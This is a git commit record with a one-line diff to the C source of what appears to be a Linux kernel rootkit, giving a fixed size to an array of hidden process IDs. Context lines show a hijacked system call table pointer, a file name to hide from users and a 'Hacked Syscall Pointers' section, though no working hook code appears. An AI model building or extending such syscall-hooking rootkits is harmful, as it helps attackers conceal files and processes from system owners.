972d012d160fbb7f81abd67817cfb864866a93ab
vfreak <vancejones53@gmail.com>
2017-05-19 10:46:43 -0700

    Changed int array size

--- p07470p33l3r.c
+++ p07470p33l3r.c
@@ -41,7 +41,7 @@ typedef unsigned long psize; // Set custom var psize to 8 bytes (64bits)
 psize *system_call_table; // Store syscall table location
 
 char *hide_file = "p07470p33l3r"; // Name of files/directories to hide from user
-char *hidden_PIDs[];
+char *hidden_PIDs[50];
 int index = 0;
 
 /* Hacked Syscall Pointers */
